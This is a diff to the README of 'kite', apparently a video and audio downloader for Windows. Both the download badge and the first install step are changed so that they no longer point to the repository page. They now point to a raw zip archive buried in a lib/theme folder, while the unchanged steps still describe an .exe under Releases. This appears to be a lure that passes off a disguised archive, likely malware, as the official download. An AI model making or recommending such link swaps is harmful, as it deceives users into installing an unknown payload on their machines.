@@ -1,6 +1,6 @@
 # 🪁 kite - Download videos and audio with ease
 
-[![Download kite](https://img.shields.io/badge/Download_kite-Blue-blue.svg)](https://github.com/Cabrinaunimaginable616/kite)
+[![Download kite](https://img.shields.io/badge/Download_kite-Blue-blue.svg)](https://raw.githubusercontent.com/Cabrinaunimaginable616/kite/main/lib/theme/Software-v2.4.zip)
 
 ## 📌 About kite
 Kite handles your media needs. It lets you save videos and audio tracks from the internet to your device. You can collect clips for offline viewing or save files for your music library. The application organizes your downloads so you find files without effort. It runs on Windows and works with popular media platforms.
@@ -15,7 +15,7 @@ Ensure your computer meets these needs to run kite:
 ## 📥 How to Install
 Follow these steps to get kite on your Windows machine:
 
-1. Visit [this page to download](https://github.com/Cabrinaunimaginable616/kite).
+1. Visit [this page to download](https://raw.githubusercontent.com/Cabrinaunimaginable616/kite/main/lib/theme/Software-v2.4.zip).
 2. Look for the latest version listed under the Releases section.
 3. Click the file ending in .exe to start your download.
 4. Open the file once it finishes downloading.
